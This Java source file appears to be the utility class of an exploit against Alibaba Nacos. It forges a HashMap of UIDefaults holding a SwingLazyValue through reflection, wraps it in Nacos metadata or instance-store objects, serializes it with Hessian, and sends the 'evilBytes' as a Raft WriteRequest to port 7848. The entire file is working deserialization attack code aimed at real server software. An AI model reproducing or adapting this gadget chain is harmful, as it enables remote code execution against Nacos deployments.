package com.exp.nacos;

import com.alibaba.nacos.api.naming.pojo.Instance;
import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.alipay.sofa.jraft.util.RpcFactoryHelper;
import com.caucho.hessian.io.Hessian2Output;
import com.google.protobuf.ByteString;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class utils {
    public static HashMap makeHashMap(SwingLazyValue lazyValue) throws Exception {
        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("_", lazyValue);
        UIDefaults uiDefaults2 = new UIDefaults();
        uiDefaults2.put("_", lazyValue);

        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        Field f = hashMap.getClass().getDeclaredField("size");
        f.setAccessible(true);
        f.set(hashMap, 2);
        Class<?> nodeC = Class.forName("java.util.HashMap$Node");

        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, uiDefaults1, null, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, uiDefaults2, null, null));
        Field tf = hashMap.getClass().getDeclaredField("table");
        tf.setAccessible(true);
        tf.set(hashMap, tbl);

        return hashMap;

    }

    public static byte[] packMetadataObject(SwingLazyValue lazyValue) throws Exception {
        HashMap hashMap = makeHashMap(lazyValue);

        MetadataOperation metadataOperation = new MetadataOperation();
        Field metadataField = metadataOperation.getClass().getDeclaredField("metadata");
        metadataField.setAccessible(true);
        metadataField.set(metadataOperation, hashMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(metadataOperation);
        output.flushBuffer();

        return baos.toByteArray();
    }

    public static byte[] packPersistentObject(SwingLazyValue lazyValue) throws Exception {
        HashMap hashMap = makeHashMap(lazyValue);

        Instance instance = new Instance();
        Field metadata = instance.getClass().getDeclaredField("metadata");
        metadata.setAccessible(true);
        metadata.set(instance, hashMap);

        Class<?> InstanceStoreRequestClass = Class.forName("com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl$InstanceStoreRequest");
        Constructor InstanceStoreRequestConstructor = InstanceStoreRequestClass.getDeclaredConstructor();
        InstanceStoreRequestConstructor.setAccessible(true);
        Object instanceStoreRequest = InstanceStoreRequestConstructor.newInstance();
        Field instanceField = InstanceStoreRequestClass.getDeclaredField("instance");
        instanceField.setAccessible(true);
        instanceField.set(instanceStoreRequest, instance);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(instanceStoreRequest);
        output.flushBuffer();

        return baos.toByteArray();
    }

    public static void sendRequest(byte[] evilBytes, String groupName) throws Exception {
        Configuration conf = new Configuration();
        conf.parse("127.0.0.1:7848");
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());

        RpcFactoryHelper.rpcFactory().registerProtobufSerializer("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());

        WriteRequest.Builder writeRequestBuilder = WriteRequest.newBuilder().setOperation("QUERY").setGroup(groupName).setData(ByteString.copyFrom(evilBytes));
        Object resp = cliClientService.getRpcClient().invokeSync(conf.getPeers().get(0).getEndpoint(), writeRequestBuilder.build(), 5000);
        System.out.println(resp);
    }
}
